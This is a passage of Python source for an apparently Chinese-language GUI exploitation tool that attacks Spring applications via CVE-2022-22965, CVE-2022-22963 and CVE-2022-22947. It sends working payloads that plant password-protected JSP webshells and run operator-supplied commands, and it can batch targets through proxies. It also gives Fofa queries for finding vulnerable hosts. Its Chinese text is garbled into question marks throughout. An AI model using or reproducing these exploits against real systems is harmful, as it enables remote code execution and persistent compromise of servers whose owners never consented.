                elif Vule == "22965-aabyss-win-get":
                    requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                    sleep(1)
                elif Vule == "22965-aabyss-shell-get":
                    requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                    sleep(1)
            else:
                if Vule == "22965-aabyss-linux-post":
                    requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False)
                    sleep(1)
                elif Vule == "22965-aabyss-win-get":
                    requests.post(url, headers=Headers_1, data=data2, timeout=6, allow_redirects=False, verify=False)
                    sleep(1)
                elif Vule == "22965-aabyss-shell-get":
                    requests.get(getpayload, headers=Headers_1, timeout=6, allow_redirects=False, verify=False)
                    sleep(1)
            test = requests.get(url + "tomcatwar.jsp")
            if (test.status_code == 200) and ('aabysszg' in str(test.text)):
                back = "[+] ???????????????CVE-2022-22965???RCE???????????????Webshell??????" + url + "tomcatwar.jsp?pwd=aabysszg&cmd=whoami"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                back = "[-] CVE-2022-22965????????????????????????????????????,shell??????????????????"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
        except Exception as e:
            back = str(e)
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
        return back
    def CVE_2022_22965(self, url, proxies):
        title = "================???????????????URL??????CVE-2022-22965????????????================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        ua = self.uas()
        tar = '[+]target ' + url
        self.info_text.insert(tk.INSERT,tar)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
        # Exp Header
        post_headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        get_headers = {
            "prefix": "<%",
            "suffix": "%>//",
            "c": "Runtime",
        }
        Vule = self.CVEs.get()
        if Vule == "CVE-2022-22965":
            log_pattern = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                      f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                      f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                      f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
        elif Vule == "22965-13exp-shell":
            log_pattern = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                         f"if(%2213exp%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in" \
                         f"%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()" \
                         f"%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20" \
                         f"while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di"
        directory = "webapps/ROOT"
        if Vule == "CVE-2022-22965":
            filename = "shell"
        elif Vule == "22965-13exp-shell":
            filename = "wbexp"
        log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
        log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
        log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
        log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        # Exp Data
        exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])
        try:
            requests.packages.urllib3.disable_warnings()
            if proxies != "":
                file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
                ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, proxies=proxies)
                ret = requests.post(url, headers=post_headers, data=exp_data, verify=False, proxies=proxies)
                back = "[+]Upload Exp: %d" % ret.status_code
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n') 
            else:
                file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
                ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
                ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
                back = "[+]Upload Exp: %d" % ret.status_code
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            if ret.status_code == 200:
                if proxies != "":
                    sleep(3)
                    ret = requests.get(url, headers=get_headers, verify=False, proxies=proxies)
                    sleep(1)
                    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False, proxies=proxies)
                    back = "[+]Wirte Shell Response Code: %d" % ret.status_code
                    self.info_text.insert(tk.INSERT,back)
                    self.info_text.insert(tk.INSERT, '\n')
                else:
                    sleep(3)
                    ret = requests.get(url, headers=get_headers, verify=False)
                    sleep(1)
                    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
                    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
                    back = "[+]Wirte Shell Response Code: %d ????????????" % ret.status_code
                    self.info_text.insert(tk.INSERT,back)
                    self.info_text.insert(tk.INSERT, '\n')
                if filename == "shell":
                    test = requests.get(url + filename +".jsp?cmd=whoami")
                elif filename == "wbexp":
                    test = requests.get(url + filename +".jsp")
                if Vule == "CVE-2022-22965" and ('//' in str(test.text)):
                    back = "[+] ???????????????CVE-2022-22965???RCE???????????????Webshell??????" + url + "shell.jsp?cmd=whoami"
                    self.info_text.insert(tk.INSERT,back)
                    self.info_text.insert(tk.INSERT, '\n')
                elif Vule == "22965-13exp-shell" and ('13exp' in str(test.text)):
                    back = "[+] ???????????????CVE-2022-22965???RCE???????????????Webshell??????" + url + "wbexp.jsp?pwd=13exp&cmd=whoami"
                    self.info_text.insert(tk.INSERT,back)
                    self.info_text.insert(tk.INSERT, '\n')
                else:
                    back = "[-] CVE-2022-22965????????????????????????????????????,shell??????????????????"
                    self.info_text.insert(tk.INSERT,back)
                    self.info_text.insert(tk.INSERT, '\n')
            else:
                back = "[-] CVE-2022-22965????????????????????????????????????,shell??????????????????"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
        except Exception as e:
            back = str(e)
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
        return back
    def cve_2022_22965_exec(self):
        url = self.rank.get()
        if url != "":
            title = "================CVE_2022_22965????????????================"
            self.info_text.insert(tk.INSERT,title)
            self.info_text.insert(tk.INSERT, '\n')
            if self.log_var.get() == "??????":
                with open("vuleLogs.log","a") as f:
                    f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                    f.write("\n")
            if ('://' not in url):
                    url = str("http://") + str(url)
            if str(url[-1]) != "/":
                url = url + "/"
            else:
                url = url
            tar = '[+]target ' + url
            self.info_text.insert(tk.INSERT,tar)
            self.info_text.insert(tk.INSERT, '\n')
            if self.log_var.get() == "??????":
                with open("vuleExecLogs.log","a") as f:
                    f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()) + " start")
                    f.write("\n")
            cmd = self.reverse_tcp.get()
            if self.CVEs.get() == 'CVE-2022-22965':
                url_shell = url + "shell.jsp?cmd={}".format(cmd)
            elif '22965-aabyss' in self.CVEs.get():
                url_shell = url + "tomcatwar.jsp?pwd=aabysszg&cmd={}".format(cmd)
            elif self.CVEs.get() == '22965-13exp-shell':
                url_shell = url + "wbexp.jsp?pwd=13exp&cmd={}".format(cmd)
            try:
                r = requests.get(url_shell)
                resp = r.text.strip("\n")
               #result = re.findall('([^\x00]+)\n', resp)[0].strip("\n")
                result = resp
            except urllib3.util.ssl_match_hostname.CertificateError:
                result = "[-] CVE_2022_22965???????????? ????????????"
            except urllib3.exceptions.MaxRetryError:
                result = "[-] CVE_2022_22965???????????? ????????????"
            except requests.exceptions.SSLError:
                result = "[-] CVE_2022_22965???????????? ????????????"
            except:
                result = "[-] CVE_2022_22965???????????? ????????????"
            self.info_text.insert(tk.INSERT,str(result))
            self.info_text.insert(tk.INSERT, '\n')
            if self.log_var.get() == "??????":
                with open("vuleExecLogs.log","a") as f:
                    f.write(str(result) + '   ' + str(strftime("%Y-%m-%d %H:%M:%S",localtime())) + " end")
                    f.write("\n")
        else:
            messagebox.showinfo("??????","?????????????????????????????????")
    # CVE_2022_22965_Exec????????????
    def CVE_2022_22965_Exec(self):
        try:
            threadVule = Thread(target=self.cve_2022_22965_exec)
            threadVule.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
    def CVE_2022_22963(self, url, proxies, execcmd):
        title = "================???????????????URL??????CVE-2022-22963????????????================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        tar = '[+]target ' + url
        self.info_text.insert(tk.INSERT,tar)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
        payload = f'T(java.lang.Runtime).getRuntime().exec("{execcmd}")'
        ua = self.uas()
        data = 'test'
        header = {
            'spring.cloud.function.routing-expression': payload,
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = 'functionRouter'
        url = url + path
        requests.packages.urllib3.disable_warnings()
        try:
            if proxies != "":
                req = requests.post(url=url, headers=header, data=data, verify=False, proxies=proxies, timeout=6)
            else:
                req = requests.post(url=url, headers=header, data=data, verify=False, timeout=6)
            code = req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'
            if code == 500 and rsp in text:
                back = f'[+] {url} ???????????????CVE-2022-22963???RCE????????????????????????shell'
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
                back = '[+] ?????????????????? ' + execcmd
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                back = "[-] CVE-2022-22963???????????????"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ConnectionError:
            back = "[-] CVE-2022-22963 ????????????,?????????????????????????????????????????????????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ReadTimeout:
            back = "[-] CVE-2022-22963 ????????????,?????????????????????????????????????????????????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.TooManyRedirects:
            back = "[-] CVE-2022-22963 ??????????????????,?????????????????????????????????????????????????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def CVE_2022_22947(self, url, proxies,execcmd):
        title = "================???????????????URL??????CVE-2022-22947????????????================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        tar = '[+]target ' + url
        self.info_text.insert(tk.INSERT,tar)
        self.info_text.insert(tk.INSERT, '\n')
        xeccmd = execcmd.strip("\n").strip(" ")
        if " " in execcmd :
            cmd = execcmd.split(" ")
            execcmd = "\\\""  + "\\\", \\\"".join(cmd) + "\\\"" 
        else:
            execcmd = "\\\"" + execcmd + "\\\"" 
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
        ua = self.uas()
        headers1 = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': ua,
            'Content-Type': 'application/json'
        }
        headers2 = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        payload = '''{\r
                  "id": "hacktest",\r
                  "filters": [{\r
                    "name": "AddResponseHeader",\r
                    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"%s\\"}).getInputStream()))}"}\r
                    }],\r
                  "uri": "http://example.com",\r
                  "order": 0\r
                }''' % execcmd
        try:
            requests.packages.urllib3.disable_warnings()
            if proxies != "":
                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False, proxies=proxies)
                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
            else:
                re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json ,verify=False)
                re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
                re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False)
                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False)
            #if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
            if re5.status_code == 200:
                back = "[+] Payload????????????????????????????????????" + '\n' + re3.text + '[END]'
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                back = "[-] CVE-2022-22947???????????????"
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ConnectionError:
            back = "[-] CVE-2022-22947 ????????????,?????????????????????????????????????????????????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.ReadTimeout:
            back = "[-] CVE-2022-22947 ????????????,?????????????????????????????????????????????????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        except requests.exceptions.TooManyRedirects:
            back = "[-] CVE-2022-22947 ??????????????????,?????????????????????????????????????????????????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def Vule(self):
        Vule = self.CVEs.get() 
        urls = self.rank_check()
        url = self.url_get(urls)
        info_proxy = self.proxy_get()
        proxies = info_proxy[-1]
        info = info_proxy[0]
        execcmd = self.reverse_tcp.get()
        if '?????????' in info:
            proxies = ""
        if url == "":
            messagebox.showinfo("??????","????????????????????????(????????????????????????)???")
        elif isinstance(url,list) == True:
            if execcmd == "":
                messagebox.showinfo("??????","???????????????????????????????????????")
            else:   
                for i in url:
                    i = i.strip("\n")
                    if ('://' not in i):
                        i = str("http://") + str(i)
                    if str(i[-1]) != "/":
                        i = i +  "/"
                    info_proxy = self.proxy_get()
                    proxies = info_proxy[-1]
                    if Vule == "CVE-2022-22965" or Vule == "22965-13exp-shell":
                        self.CVE_2022_22965(i, proxies)
                        #self.CVE_2022_22965(i, proxies)
                    elif Vule == "CVE-2022-22963":
                        self.CVE_2022_22963(i, proxies,execcmd)
                    elif Vule == "CVE-2022-22947":
                        self.CVE_2022_22947(i, proxies,execcmd)
                    elif "22965-aabyss" in Vule:
                        self.CVE_2022_22965_aabysszg(i, proxies)
                        
        else:
            url = url.strip("\n")
            if ('://' not in url):
                url = str("http://") + str(url)
            if str(url[-1]) != "/":
                url = url +  "/"
            if Vule == "CVE-2022-22965" or Vule == "22965-13exp-shell":
                self.CVE_2022_22965(url, proxies)
            elif Vule == "CVE-2022-22963":
                execcmd = self.reverse_tcp.get()
                if execcmd == "":
                    messagebox.showinfo("??????","????????????????????????,????????????")
                else:
                    self.CVE_2022_22963(url, proxies,execcmd)
            elif Vule == "CVE-2022-22947":
                if execcmd == "":
                    messagebox.showinfo("??????","????????????????????????,????????????")
                else:
                    self.CVE_2022_22947(url, proxies,execcmd)
            elif "22965-aabyss" in Vule:
                back = self.CVE_2022_22965_aabysszg(url, proxies)
                if "[-]" in back:
                    back = "[+]????????????????????? ??????5???"
                    self.info_text.insert(tk.INSERT,back)
                    self.info_text.insert(tk.INSERT, '\n')
                    sleep(5)
                    self.CVE_2022_22965_aabysszg(url, proxies)
        back = "[+]??????????????????"
        self.info_text.insert(tk.INSERT,back)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def vule(self):
        try:
            threadVule = Thread(target=self.Vule)
            threadVule.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
class Fofa_from:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Fofa??????")
        self.root.geometry("280x100")
        tk.Label(self.root,text='???????????????icon_hash="116323821"').place(x=40,y=10)
        tk.Label(self.root,text='?????????????????????body="Whitelabel Error Page"').place(x=10,y=40)
        self.root.resizable(0,0)
if __name__ == '__main__':
    if os.geteuid() == 0:
        start = RootFrom()
    else:
        print("??????root????????????!")
        sys.exit(1)
